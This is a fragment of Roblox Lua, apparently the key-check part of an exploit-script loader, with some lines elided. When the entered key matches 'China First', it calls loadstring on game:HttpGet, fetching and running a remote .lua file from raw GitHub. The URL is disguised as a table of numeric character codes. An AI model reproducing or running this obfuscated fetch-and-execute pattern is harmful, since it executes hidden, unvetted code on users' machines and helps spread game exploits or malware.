...
Start.MouseButton1Click:Connect(function()
    if Key.Text == "China First" then
        ...
        local CoreGui = game:GetService("StarterGui")
         ...
         loadstring(game:HttpGet(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,114,101,110,108,117,97,121,121,100,115,54,54,54,47,114,101,110,47,109,97,105,110,47,55,54,52,54,52,57,55,57,57,55,46,108,117,97})end)())))();
        else
